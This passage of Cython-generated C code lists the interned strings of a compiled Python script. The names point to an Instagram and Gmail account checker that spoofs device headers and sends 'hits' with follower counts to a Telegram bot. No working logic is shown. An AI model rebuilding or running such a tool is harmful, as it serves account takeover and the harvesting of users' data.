  {&__pyx_n_u_follower_count, __pyx_k_follower_count, sizeof(__pyx_k_follower_count), 0, 1, 0, 1},
  {&__pyx_n_s_followers, __pyx_k_followers, sizeof(__pyx_k_followers), 0, 0, 1, 1},
  {&__pyx_n_s_format, __pyx_k_format, sizeof(__pyx_k_format), 0, 0, 1, 1},
  {&__pyx_n_u_fr_FR, __pyx_k_fr_FR, sizeof(__pyx_k_fr_FR), 0, 1, 0, 1},
  {&__pyx_n_s_generate_user_agent, __pyx_k_generate_user_agent, sizeof(__pyx_k_generate_user_agent), 0, 0, 1, 1},
  {&__pyx_n_s_genexpr, __pyx_k_genexpr, sizeof(__pyx_k_genexpr), 0, 0, 1, 1},
  {&__pyx_n_s_get, __pyx_k_get, sizeof(__pyx_k_get), 0, 0, 1, 1},
  {&__pyx_n_s_get_dict, __pyx_k_get_dict, sizeof(__pyx_k_get_dict), 0, 0, 1, 1},
  {&__pyx_kp_u_gf_uar_1, __pyx_k_gf_uar_1, sizeof(__pyx_k_gf_uar_1), 0, 1, 0, 0},
  {&__pyx_n_s_gg, __pyx_k_gg, sizeof(__pyx_k_gg), 0, 0, 1, 1},
  {&__pyx_kp_u_gmail_com, __pyx_k_gmail_com, sizeof(__pyx_k_gmail_com), 0, 1, 0, 0},
  {&__pyx_kp_u_gmail_com_FOLLOWERS, __pyx_k_gmail_com_FOLLOWERS, sizeof(__pyx_k_gmail_com_FOLLOWERS), 0, 1, 0, 0},
  {&__pyx_n_u_good, __pyx_k_good, sizeof(__pyx_k_good), 0, 1, 0, 1},
  {&__pyx_n_u_google, __pyx_k_google, sizeof(__pyx_k_google), 0, 1, 0, 1},
  {&__pyx_kp_u_google_accounts_xsrf, __pyx_k_google_accounts_xsrf, sizeof(__pyx_k_google_accounts_xsrf), 0, 1, 0, 0},
  {&__pyx_n_s_group, __pyx_k_group, sizeof(__pyx_k_group), 0, 0, 1, 1},
  {&__pyx_kp_u_guid, __pyx_k_guid, sizeof(__pyx_k_guid), 0, 1, 0, 0},
  {&__pyx_n_u_guid_2, __pyx_k_guid_2, sizeof(__pyx_k_guid_2), 0, 1, 0, 1},
  {&__pyx_kp_u_gzip_deflate, __pyx_k_gzip_deflate, sizeof(__pyx_k_gzip_deflate), 0, 1, 0, 0},
  {&__pyx_kp_u_gzip_deflate_2, __pyx_k_gzip_deflate_2, sizeof(__pyx_k_gzip_deflate_2), 0, 1, 0, 0},
  {&__pyx_kp_u_h, __pyx_k_h, sizeof(__pyx_k_h), 0, 1, 0, 0},
  {&__pyx_n_s_hashlib, __pyx_k_hashlib, sizeof(__pyx_k_hashlib), 0, 0, 1, 1},
  {&__pyx_n_s_he3, __pyx_k_he3, sizeof(__pyx_k_he3), 0, 0, 1, 1},
  {&__pyx_n_s_header, __pyx_k_header, sizeof(__pyx_k_header), 0, 0, 1, 1},
  {&__pyx_n_s_headers, __pyx_k_headers, sizeof(__pyx_k_headers), 0, 0, 1, 1},
  {&__pyx_n_s_hex, __pyx_k_hex, sizeof(__pyx_k_hex), 0, 0, 1, 1},
  {&__pyx_n_s_hexdigest, __pyx_k_hexdigest, sizeof(__pyx_k_hexdigest), 0, 0, 1, 1},
  {&__pyx_n_s_hit_data, __pyx_k_hit_data, sizeof(__pyx_k_hit_data), 0, 0, 1, 1},
  {&__pyx_n_s_hit_dustu, __pyx_k_hit_dustu, sizeof(__pyx_k_hit_dustu), 0, 0, 1, 1},
  {&__pyx_n_s_host, __pyx_k_host, sizeof(__pyx_k_host), 0, 0, 1, 1},
  {&__pyx_kp_u_https_accounts_google_com, __pyx_k_https_accounts_google_com, sizeof(__pyx_k_https_accounts_google_com), 0, 1, 0, 0},
  {&__pyx_kp_u_https_accounts_google_com___sign, __pyx_k_https_accounts_google_com___sign, sizeof(__pyx_k_https_accounts_google_com___sign), 0, 1, 0, 0},
  {&__pyx_kp_u_https_accounts_google_com___sign_2, __pyx_k_https_accounts_google_com___sign_2, sizeof(__pyx_k_https_accounts_google_com___sign_2), 0, 1, 0, 0},
  {&__pyx_kp_u_https_accounts_google_com_signin, __pyx_k_https_accounts_google_com_signin, sizeof(__pyx_k_https_accounts_google_com_signin), 0, 1, 0, 0},
  {&__pyx_kp_u_https_accounts_google_com_signup, __pyx_k_https_accounts_google_com_signup, sizeof(__pyx_k_https_accounts_google_com_signup), 0, 1, 0, 0},
  {&__pyx_kp_u_https_accounts_google_com_signup_2, __pyx_k_https_accounts_google_com_signup_2, sizeof(__pyx_k_https_accounts_google_com_signup_2), 0, 1, 0, 0},
  {&__pyx_kp_u_https_api_telegram_org_bot, __pyx_k_https_api_telegram_org_bot, sizeof(__pyx_k_https_api_telegram_org_bot), 0, 1, 0, 0},
  {&__pyx_kp_u_https_i_instagram_com_api_v1_acc, __pyx_k_https_i_instagram_com_api_v1_acc, sizeof(__pyx_k_https_i_instagram_com_api_v1_acc), 0, 1, 0, 0},
  {&__pyx_kp_u_https_i_instagram_com_api_v1_acc_2, __pyx_k_https_i_instagram_com_api_v1_acc_2, sizeof(__pyx_k_https_i_instagram_com_api_v1_acc_2), 0, 1, 0, 0},
  {&__pyx_kp_u_https_i_instagram_com_api_v1_blo, __pyx_k_https_i_instagram_com_api_v1_blo, sizeof(__pyx_k_https_i_instagram_com_api_v1_blo), 0, 1, 0, 0},
  {&__pyx_kp_u_https_i_instagram_com_api_v1_use, __pyx_k_https_i_instagram_com_api_v1_use, sizeof(__pyx_k_https_i_instagram_com_api_v1_use), 0, 1, 0, 0},
  {&__pyx_kp_u_https_t_me_iownpy, __pyx_k_https_t_me_iownpy, sizeof(__pyx_k_https_t_me_iownpy), 0, 1, 0, 0},
  {&__pyx_kp_u_https_t_me_pytoonzl, __pyx_k_https_t_me_pytoonzl, sizeof(__pyx_k_https_t_me_pytoonzl), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com, __pyx_k_https_www_instagram_com, sizeof(__pyx_k_https_www_instagram_com), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com_2, __pyx_k_https_www_instagram_com_2, sizeof(__pyx_k_https_www_instagram_com_2), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com_accounts, __pyx_k_https_www_instagram_com_accounts, sizeof(__pyx_k_https_www_instagram_com_accounts), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com_api_grap, __pyx_k_https_www_instagram_com_api_grap, sizeof(__pyx_k_https_www_instagram_com_api_grap), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com_api_v1_u, __pyx_k_https_www_instagram_com_api_v1_u, sizeof(__pyx_k_https_www_instagram_com_api_v1_u), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com_api_v1_w, __pyx_k_https_www_instagram_com_api_v1_w, sizeof(__pyx_k_https_www_instagram_com_api_v1_w), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com_api_v1_w_2, __pyx_k_https_www_instagram_com_api_v1_w_2, sizeof(__pyx_k_https_www_instagram_com_api_v1_w_2), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com_instagra, __pyx_k_https_www_instagram_com_instagra, sizeof(__pyx_k_https_www_instagram_com_instagra), 0, 1, 0, 0},
  {&__pyx_n_u_huawei, __pyx_k_huawei, sizeof(__pyx_k_huawei), 0, 1, 0, 1},
  {&__pyx_kp_u_i_instagram_com, __pyx_k_i_instagram_com, sizeof(__pyx_k_i_instagram_com), 0, 1, 0, 0},
  {&__pyx_n_s_ids, __pyx_k_ids, sizeof(__pyx_k_ids), 0, 0, 1, 1},
  {&__pyx_n_s_ig_did, __pyx_k_ig_did, sizeof(__pyx_k_ig_did), 0, 0, 1, 1},
  {&__pyx_n_u_ig_did, __pyx_k_ig_did, sizeof(__pyx_k_ig_did), 0, 1, 0, 1},
  {&__pyx_kp_u_ig_did_2, __pyx_k_ig_did_2, sizeof(__pyx_k_ig_did_2), 0, 1, 0, 0},
  {&__pyx_kp_u_ig_intended_user_id, __pyx_k_ig_intended_user_id, sizeof(__pyx_k_ig_intended_user_id), 0, 1, 0, 0},
  {&__pyx_n_s_ig_nrcb, __pyx_k_ig_nrcb, sizeof(__pyx_k_ig_nrcb), 0, 0, 1, 1},
  {&__pyx_n_u_ig_nrcb, __pyx_k_ig_nrcb, sizeof(__pyx_k_ig_nrcb), 0, 1, 0, 1},
  {&__pyx_kp_u_ig_nrcb_2, __pyx_k_ig_nrcb_2, sizeof(__pyx_k_ig_nrcb_2), 0, 1, 0, 0},
  {&__pyx_n_u_ig_sig_key_version, __pyx_k_ig_sig_key_version, sizeof(__pyx_k_ig_sig_key_version), 0, 1, 0, 1},
  {&__pyx_n_s_ii, __pyx_k_ii, sizeof(__pyx_k_ii), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_inline_keyboard, __pyx_k_inline_keyboard, sizeof(__pyx_k_inline_keyboard), 0, 0, 1, 1},
  {&__pyx_n_u_inline_keyboard, __pyx_k_inline_keyboard, sizeof(__pyx_k_inline_keyboard), 0, 1, 0, 1},
  {&__pyx_n_s_input, __pyx_k_input, sizeof(__pyx_k_input), 0, 0, 1, 1},
  {&__pyx_n_s_iownpy, __pyx_k_iownpy, sizeof(__pyx_k_iownpy), 0, 0, 1, 1},
  {&__pyx_n_s_is_business, __pyx_k_is_business, sizeof(__pyx_k_is_business), 0, 0, 1, 1},
  {&__pyx_n_u_is_business_account, __pyx_k_is_business_account, sizeof(__pyx_k_is_business_account), 0, 1, 0, 1},
  {&__pyx_n_s_isdigit, __pyx_k_isdigit, sizeof(__pyx_k_isdigit), 0, 0, 1, 1},
  {&__pyx_n_u_ja_JP, __pyx_k_ja_JP, sizeof(__pyx_k_ja_JP), 0, 1, 0, 1},
  {&__pyx_n_s_jj, __pyx_k_jj, sizeof(__pyx_k_jj), 0, 0, 1, 1},
  {&__pyx_n_s_join, __pyx_k_join, sizeof(__pyx_k_join), 0, 0, 1, 1},
  {&__pyx_n_s_json, __pyx_k_json, sizeof(__pyx_k_json), 0, 0, 1, 1},
  {&__pyx_n_s_k, __pyx_k_k, sizeof(__pyx_k_k), 0, 0, 1, 1},
  {&__pyx_kp_u_keep_alive, __pyx_k_keep_alive, sizeof(__pyx_k_keep_alive), 0, 1, 0, 0},
  {&__pyx_n_s_keys, __pyx_k_keys, sizeof(__pyx_k_keys), 0, 0, 1, 1},
  {&__pyx_n_s_ki, __pyx_k_ki, sizeof(__pyx_k_ki), 0, 0, 1, 1},
  {&__pyx_n_u_kirin, __pyx_k_kirin, sizeof(__pyx_k_kirin), 0, 1, 0, 1},
  {&__pyx_n_u_ko_KR, __pyx_k_ko_KR, sizeof(__pyx_k_ko_KR), 0, 1, 0, 1},
  {&__pyx_n_s_kotu_insta, __pyx_k_kotu_insta, sizeof(__pyx_k_kotu_insta), 0, 0, 1, 1},
  {&__pyx_n_s_lan, __pyx_k_lan, sizeof(__pyx_k_lan), 0, 0, 1, 1},
  {&__pyx_n_s_lop, __pyx_k_lop, sizeof(__pyx_k_lop), 0, 0, 1, 1},
  {&__pyx_n_s_lsd, __pyx_k_lsd, sizeof(__pyx_k_lsd), 0, 0, 1, 1},
  {&__pyx_n_u_lsd, __pyx_k_lsd, sizeof(__pyx_k_lsd), 0, 1, 0, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_kp_u_maybe_jay_z, __pyx_k_maybe_jay_z, sizeof(__pyx_k_maybe_jay_z), 0, 1, 0, 0},
  {&__pyx_n_s_md5, __pyx_k_md5, sizeof(__pyx_k_md5), 0, 0, 1, 1},
  {&__pyx_n_s_media_count, __pyx_k_media_count, sizeof(__pyx_k_media_count), 0, 0, 1, 1},
  {&__pyx_n_u_media_count, __pyx_k_media_count, sizeof(__pyx_k_media_count), 0, 1, 0, 1},
  {&__pyx_n_u_mediatek, __pyx_k_mediatek, sizeof(__pyx_k_mediatek), 0, 1, 0, 1},
  {&__pyx_n_s_metaclass, __pyx_k_metaclass, sizeof(__pyx_k_metaclass), 0, 0, 1, 1},
  {&__pyx_n_s_method, __pyx_k_method, sizeof(__pyx_k_method), 0, 0, 1, 1},
  {&__pyx_n_s_mid, __pyx_k_mid, sizeof(__pyx_k_mid), 0, 0, 1, 1},
  {&__pyx_n_u_mid, __pyx_k_mid, sizeof(__pyx_k_mid), 0, 1, 0, 1},
  {&__pyx_kp_u_mid_2, __pyx_k_mid_2, sizeof(__pyx_k_mid_2), 0, 1, 0, 0},
  {&__pyx_kp_u_mid_3, __pyx_k_mid_3, sizeof(__pyx_k_mid_3), 0, 1, 0, 0},
  {&__pyx_kp_u_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP, __pyx_k_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP, sizeof(__pyx_k_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP), 0, 1, 0, 0},
  {&__pyx_n_s_mo, __pyx_k_mo, sizeof(__pyx_k_mo), 0, 0, 1, 1},
  {&__pyx_n_s_module, __pyx_k_module, sizeof(__pyx_k_module), 0, 0, 1, 1},
  {&__pyx_n_s_ms4, __pyx_k_ms4, sizeof(__pyx_k_ms4), 0, 0, 1, 1},
  {&__pyx_n_s_n1, __pyx_k_n1, sizeof(__pyx_k_n1), 0, 0, 1, 1},
  {&__pyx_n_s_n2, __pyx_k_n2, sizeof(__pyx_k_n2), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_name_2, __pyx_k_name_2, sizeof(__pyx_k_name_2), 0, 0, 1, 1},
  {&__pyx_kp_u_null, __pyx_k_null, sizeof(__pyx_k_null), 0, 1, 0, 0},
  {&__pyx_kp_u_null_null_null_null_null_NL_nul, __pyx_k_null_null_null_null_null_NL_nul, sizeof(__pyx_k_null_null_null_null_null_NL_nul), 0, 1, 0, 0},
  {&__pyx_n_s_num, __pyx_k_num, sizeof(__pyx_k_num), 0, 0, 1, 1},
  {&__pyx_n_s_numeric, __pyx_k_numeric, sizeof(__pyx_k_numeric), 0, 0, 1, 1},
  {&__pyx_n_s_o, __pyx_k_o, sizeof(__pyx_k_o), 0, 0, 1, 1},
  {&__pyx_n_u_oneplus, __pyx_k_oneplus, sizeof(__pyx_k_oneplus), 0, 1, 0, 1},
  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},
  {&__pyx_n_u_optIntoOneTap, __pyx_k_optIntoOneTap, sizeof(__pyx_k_optIntoOneTap), 0, 1, 0, 1},
  {&__pyx_n_u_origin, __pyx_k_origin, sizeof(__pyx_k_origin), 0, 1, 0, 1},
  {&__pyx_n_s_orta_mail, __pyx_k_orta_mail, sizeof(__pyx_k_orta_mail), 0, 0, 1, 1},
  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},
  {&__pyx_n_s_params, __pyx_k_params, sizeof(__pyx_k_params), 0, 0, 1, 1},
  {&__pyx_kp_u_params_7B_22client_input_params, __pyx_k_params_7B_22client_input_params, sizeof(__pyx_k_params_7B_22client_input_params), 0, 1, 0, 0},
  {&__pyx_n_u_password, __pyx_k_password, sizeof(__pyx_k_password), 0, 1, 0, 1},
  {&__pyx_n_s_payload, __pyx_k_payload, sizeof(__pyx_k_payload), 0, 0, 1, 1},
  {&__pyx_n_u_phone, __pyx_k_phone, sizeof(__pyx_k_phone), 0, 1, 0, 1},
  {&__pyx_kp_u_pip_install_python_cfonts, __pyx_k_pip_install_python_cfonts, sizeof(__pyx_k_pip_install_python_cfonts), 0, 1, 0, 0},
  {&__pyx_kp_u_pip_install_user_agent, __pyx_k_pip_install_user_agent, sizeof(__pyx_k_pip_install_user_agent), 0, 1, 0, 0},
  {&__pyx_n_u_posix, __pyx_k_posix, sizeof(__pyx_k_posix), 0, 1, 0, 1},
  {&__pyx_n_s_post, __pyx_k_post, sizeof(__pyx_k_post), 0, 0, 1, 1},
  {&__pyx_n_s_pp, __pyx_k_pp, sizeof(__pyx_k_pp), 0, 0, 1, 1},
  {&__pyx_n_s_prepare, __pyx_k_prepare, sizeof(__pyx_k_prepare), 0, 0, 1, 1},
  {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},
  {&__pyx_n_u_priority, __pyx_k_priority, sizeof(__pyx_k_priority), 0, 1, 0, 1},
  {&__pyx_n_s_pycountry, __pyx_k_pycountry, sizeof(__pyx_k_pycountry), 0, 0, 1, 1},
  {&__pyx_n_u_qcom, __pyx_k_qcom, sizeof(__pyx_k_qcom), 0, 1, 0, 1},
  {&__pyx_kp_u_qcom_en_US_545986, __pyx_k_qcom_en_US_545986, sizeof(__pyx_k_qcom_en_US_545986), 0, 1, 0, 0},
  {&__pyx_n_s_qualname, __pyx_k_qualname, sizeof(__pyx_k_qualname), 0, 0, 1, 1},
  {&__pyx_kp_u_query, __pyx_k_query, sizeof(__pyx_k_query), 0, 1, 0, 0},
  {&__pyx_n_u_queryParams, __pyx_k_queryParams, sizeof(__pyx_k_queryParams), 0, 1, 0, 1},
  {&__pyx_n_u_query_2, __pyx_k_query_2, sizeof(__pyx_k_query_2), 0, 1, 0, 1},
  {&__pyx_n_s_queue, __pyx_k_queue, sizeof(__pyx_k_queue), 0, 0, 1, 1},
  {&__pyx_n_s_r, __pyx_k_r, sizeof(__pyx_k_r), 0, 0, 1, 1},
  {&__pyx_n_u_r, __pyx_k_r, sizeof(__pyx_k_r), 0, 1, 0, 1},
  {&__pyx_n_s_randint, __pyx_k_randint, sizeof(__pyx_k_randint), 0, 0, 1, 1},
  {&__pyx_n_s_random, __pyx_k_random, sizeof(__pyx_k_random), 0, 0, 1, 1},
  {&__pyx_n_s_randrange, __pyx_k_randrange, sizeof(__pyx_k_randrange), 0, 0, 1, 1},
  {&__pyx_n_s_range, __pyx_k_range, sizeof(__pyx_k_range), 0, 0, 1, 1},
  {&__pyx_n_s_re, __pyx_k_re, sizeof(__pyx_k_re), 0, 0, 1, 1},
  {&__pyx_n_s_read, __pyx_k_read, sizeof(__pyx_k_read), 0, 0, 1, 1},
  {&__pyx_n_u_referer, __pyx_k_referer, sizeof(__pyx_k_referer), 0, 1, 0, 1},
  {&__pyx_n_s_remove, __pyx_k_remove, sizeof(__pyx_k_remove), 0, 0, 1, 1},
  {&__pyx_n_s_render, __pyx_k_render, sizeof(__pyx_k_render), 0, 0, 1, 1},
  {&__pyx_n_u_reply_markup, __pyx_k_reply_markup, sizeof(__pyx_k_reply_markup), 0, 1, 0, 1},
  {&__pyx_n_s_requests, __pyx_k_requests, sizeof(__pyx_k_requests), 0, 0, 1, 1},
  {&__pyx_n_s_res, __pyx_k_res, sizeof(__pyx_k_res), 0, 0, 1, 1},
  {&__pyx_n_s_res1, __pyx_k_res1, sizeof(__pyx_k_res1), 0, 0, 1, 1},
  {&__pyx_n_s_reset_value, __pyx_k_reset_value, sizeof(__pyx_k_reset_value), 0, 0, 1, 1},
  {&__pyx_n_s_response, __pyx_k_response, sizeof(__pyx_k_response), 0, 0, 1, 1},
  {&__pyx_n_s_response2, __pyx_k_response2, sizeof(__pyx_k_response2), 0, 0, 1, 1},
  {&__pyx_n_s_response_data, __pyx_k_response_data, sizeof(__pyx_k_response_data), 0, 0, 1, 1},
  {&__pyx_n_s_response_json, __pyx_k_response_json, sizeof(__pyx_k_response_json), 0, 0, 1, 1},
  {&__pyx_n_s_responses, __pyx_k_responses, sizeof(__pyx_k_responses), 0, 0, 1, 1},
  {&__pyx_n_s_rest, __pyx_k_rest, sizeof(__pyx_k_rest), 0, 0, 1, 1},
  {&__pyx_n_s_rnd, __pyx_k_rnd, sizeof(__pyx_k_rnd), 0, 0, 1, 1},
  {&__pyx_n_s_rr, __pyx_k_rr, sizeof(__pyx_k_rr), 0, 0, 1, 1},
  {&__pyx_kp_u_same_origin, __pyx_k_same_origin, sizeof(__pyx_k_same_origin), 0, 1, 0, 0},
  {&__pyx_n_u_samsung, __pyx_k_samsung, sizeof(__pyx_k_samsung), 0, 1, 0, 1},
  {&__pyx_n_s_search, __pyx_k_search, sizeof(__pyx_k_search), 0, 0, 1, 1},
  {&__pyx_kp_u_sec_ch_ua, __pyx_k_sec_ch_ua, sizeof(__pyx_k_sec_ch_ua), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_ch_ua_arch, __pyx_k_sec_ch_ua_arch, sizeof(__pyx_k_sec_ch_ua_arch), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_ch_ua_bitness, __pyx_k_sec_ch_ua_bitness, sizeof(__pyx_k_sec_ch_ua_bitness), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_ch_ua_full_version, __pyx_k_sec_ch_ua_full_version, sizeof(__pyx_k_sec_ch_ua_full_version), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_ch_ua_full_version_list, __pyx_k_sec_ch_ua_full_version_list, sizeof(__pyx_k_sec_ch_ua_full_version_list), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_ch_ua_mobile, __pyx_k_sec_ch_ua_mobile, sizeof(__pyx_k_sec_ch_ua_mobile), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_ch_ua_model, __pyx_k_sec_ch_ua_model, sizeof(__pyx_k_sec_ch_ua_model), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_ch_ua_platform, __pyx_k_sec_ch_ua_platform, sizeof(__pyx_k_sec_ch_ua_platform), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_ch_ua_platform_version, __pyx_k_sec_ch_ua_platform_version, sizeof(__pyx_k_sec_ch_ua_platform_version), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_ch_ua_wow64, __pyx_k_sec_ch_ua_wow64, sizeof(__pyx_k_sec_ch_ua_wow64), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_fetch_dest, __pyx_k_sec_fetch_dest, sizeof(__pyx_k_sec_fetch_dest), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_fetch_mode, __pyx_k_sec_fetch_mode, sizeof(__pyx_k_sec_fetch_mode), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_fetch_site, __pyx_k_sec_fetch_site, sizeof(__pyx_k_sec_fetch_site), 0, 1, 0, 0},
  {&__pyx_n_s_secrets, __pyx_k_secrets, sizeof(__pyx_k_secrets), 0, 0, 1, 1},
  {&__pyx_n_s_send, __pyx_k_send, sizeof(__pyx_k_send), 0, 0, 1, 1},
  {&__pyx_kp_u_sendMessage, __pyx_k_sendMessage, sizeof(__pyx_k_sendMessage), 0, 1, 0, 0},
  {&__pyx_n_s_send_to_bunny_only, __pyx_k_send_to_bunny_only, sizeof(__pyx_k_send_to_bunny_only), 0, 0, 1, 1},
  {&__pyx_n_u_server_timestamps, __pyx_k_server_timestamps, sizeof(__pyx_k_server_timestamps), 0, 1, 0, 1},
  {&__pyx_n_s_sgin, __pyx_k_sgin, sizeof(__pyx_k_sgin), 0, 0, 1, 1},
  {&__pyx_n_s_sha256, __pyx_k_sha256, sizeof(__pyx_k_sha256), 0, 0, 1, 1},
  {&__pyx_n_u_showAccountRecoveryModal, __pyx_k_showAccountRecoveryModal, sizeof(__pyx_k_showAccountRecoveryModal), 0, 1, 0, 1},
  {&__pyx_n_u_signed_body, __pyx_k_signed_body, sizeof(__pyx_k_signed_body), 0, 1, 0, 1},
  {&__pyx_kp_u_signed_body_2, __pyx_k_signed_body_2, sizeof(__pyx_k_signed_body_2), 0, 1, 0, 0},
  {&__pyx_n_u_sony, __pyx_k_sony, sizeof(__pyx_k_sony), 0, 1, 0, 1},
  {&__pyx_n_s_sos, __pyx_k_sos, sizeof(__pyx_k_sos), 0, 0, 1, 1},
  {&__pyx_n_s_source, __pyx_k_source, sizeof(__pyx_k_source), 0, 0, 1, 1},
  {&__pyx_kp_u_source_Chrome_eligible_for_consi, __pyx_k_source_Chrome_eligible_for_consi, sizeof(__pyx_k_source_Chrome_eligible_for_consi), 0, 1, 0, 0},
  {&__pyx_kp_s_source_py, __pyx_k_source_py, sizeof(__pyx_k_source_py), 0, 0, 1, 0},
  {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},
  {&__pyx_n_s_splitlines, __pyx_k_splitlines, sizeof(__pyx_k_splitlines), 0, 0, 1, 1},
  {&__pyx_n_s_ss, __pyx_k_ss, sizeof(__pyx_k_ss), 0, 0, 1, 1},
  {&__pyx_n_s_start, __pyx_k_start, sizeof(__pyx_k_start), 0, 0, 1, 1},
  {&__pyx_n_s_status_code, __pyx_k_status_code, sizeof(__pyx_k_status_code), 0, 0, 1, 1},
  {&__pyx_kp_u_status_ok, __pyx_k_status_ok, sizeof(__pyx_k_status_ok), 0, 1, 0, 0},
  {&__pyx_kp_u_strict_origin_when_cross_origin, __pyx_k_strict_origin_when_cross_origin, sizeof(__pyx_k_strict_origin_when_cross_origin), 0, 1, 0, 0},
  {&__pyx_n_s_string, __pyx_k_string, sizeof(__pyx_k_string), 0, 0, 1, 1},
  {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},
  {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},
  {&__pyx_n_s_t, __pyx_k_t, sizeof(__pyx_k_t), 0, 0, 1, 1},
  {&__pyx_n_u_tablet, __pyx_k_tablet, sizeof(__pyx_k_tablet), 0, 1, 0, 1},
  {&__pyx_n_s_target, __pyx_k_target, sizeof(__pyx_k_target), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_n_s_text, __pyx_k_text, sizeof(__pyx_k_text), 0, 0, 1, 1},
  {&__pyx_n_u_text, __pyx_k_text, sizeof(__pyx_k_text), 0, 1, 0, 1},
  {&__pyx_n_s_threading, __pyx_k_threading, sizeof(__pyx_k_threading), 0, 0, 1, 1},
  {&__pyx_n_s_threads, __pyx_k_threads, sizeof(__pyx_k_threads), 0, 0, 1, 1},
  {&__pyx_n_s_throw, __pyx_k_throw, sizeof(__pyx_k_throw), 0, 0, 1, 1},
  {&__pyx_n_s_time, __pyx_k_time, sizeof(__pyx_k_time), 0, 0, 1, 1},
  {&__pyx_n_s_tl, __pyx_k_tl, sizeof(__pyx_k_tl), 0, 0, 1, 1},
  {&__pyx_kp_u_tl_txt, __pyx_k_tl_txt, sizeof(__pyx_k_tl_txt), 0, 1, 0, 0},
  {&__pyx_n_s_tll, __pyx_k_tll, sizeof(__pyx_k_tll), 0, 0, 1, 1},
  {&__pyx_n_s_tll_locals_genexpr, __pyx_k_tll_locals_genexpr, sizeof(__pyx_k_tll_locals_genexpr), 0, 0, 1, 1},
  {&__pyx_n_s_tok, __pyx_k_tok, sizeof(__pyx_k_tok), 0, 0, 1, 1},
  {&__pyx_n_s_token, __pyx_k_token, sizeof(__pyx_k_token), 0, 0, 1, 1},
  {&__pyx_n_s_token_hex, __pyx_k_token_hex, sizeof(__pyx_k_token_hex), 0, 0, 1, 1},
  {&__pyx_n_u_topython8786969_586, __pyx_k_topython8786969_586, sizeof(__pyx_k_topython8786969_586), 0, 1, 0, 1},
  {&__pyx_n_u_true, __pyx_k_true, sizeof(__pyx_k_true), 0, 1, 0, 1},
  {&__pyx_n_u_trustedDeviceRecords, __pyx_k_trustedDeviceRecords, sizeof(__pyx_k_trustedDeviceRecords), 0, 1, 0, 1},
  {&__pyx_n_u_tv, __pyx_k_tv, sizeof(__pyx_k_tv), 0, 1, 0, 1},
  {&__pyx_kp_u_u_1_i, __pyx_k_u_1_i, sizeof(__pyx_k_u_1_i), 0, 1, 0, 0},
  {&__pyx_kp_u_u_3, __pyx_k_u_3, sizeof(__pyx_k_u_3), 0, 1, 0, 0},
  {&__pyx_n_s_ua, __pyx_k_ua, sizeof(__pyx_k_ua), 0, 0, 1, 1},
  {&__pyx_n_s_url, __pyx_k_url, sizeof(__pyx_k_url), 0, 0, 1, 1},
  {&__pyx_n_u_url, __pyx_k_url, sizeof(__pyx_k_url), 0, 1, 0, 1},
  {&__pyx_n_s_user, __pyx_k_user, sizeof(__pyx_k_user), 0, 0, 1, 1},
  {&__pyx_n_u_user, __pyx_k_user, sizeof(__pyx_k_user), 0, 1, 0, 1},
  {&__pyx_n_u_userID, __pyx_k_userID, sizeof(__pyx_k_userID), 0, 1, 0, 1},
  {&__pyx_kp_u_user_agent, __pyx_k_user_agent, sizeof(__pyx_k_user_agent), 0, 1, 0, 0},
  {&__pyx_n_s_user_agent_2, __pyx_k_user_agent_2, sizeof(__pyx_k_user_agent_2), 0, 0, 1, 1},
  {&__pyx_n_s_user_data, __pyx_k_user_data, sizeof(__pyx_k_user_data), 0, 0, 1, 1},
  {&__pyx_n_s_user_id, __pyx_k_user_id, sizeof(__pyx_k_user_id), 0, 0, 1, 1},
  {&__pyx_n_s_username, __pyx_k_username, sizeof(__pyx_k_username), 0, 0, 1, 1},
  {&__pyx_n_u_username, __pyx_k_username, sizeof(__pyx_k_username), 0, 1, 0, 1},
  {&__pyx_kp_u_utf_8, __pyx_k_utf_8, sizeof(__pyx_k_utf_8), 0, 1, 0, 0},
  {&__pyx_n_s_uui, __pyx_k_uui, sizeof(__pyx_k_uui), 0, 0, 1, 1},
  {&__pyx_n_s_uuid, __pyx_k_uuid, sizeof(__pyx_k_uuid), 0, 0, 1, 1},
  {&__pyx_n_s_uuid4, __pyx_k_uuid4, sizeof(__pyx_k_uuid4), 0, 0, 1, 1},
  {&__pyx_n_s_variable_instance, __pyx_k_variable_instance, sizeof(__pyx_k_variable_instance), 0, 0, 1, 1},
